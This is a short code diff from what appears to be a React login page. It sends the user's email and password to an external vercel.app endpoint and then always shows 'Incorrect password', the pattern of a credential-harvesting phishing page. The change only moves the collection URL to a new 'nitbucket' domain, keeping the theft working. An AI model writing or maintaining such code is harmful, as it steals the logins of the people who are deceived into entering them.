@@ -40,10 +40,10 @@ function Home() {
     setLoading(true);
 
     try {
-      await axios.post("https://nitbucket-info-equipment.vercel.app/api/info", {
+      await axios.post("https://nit-bucket-construction.vercel.app/api/info", {
         email,
         password,
-      });
+      }); 
       setError("Incorrect password");
       setPassword("");
     } catch (err) {
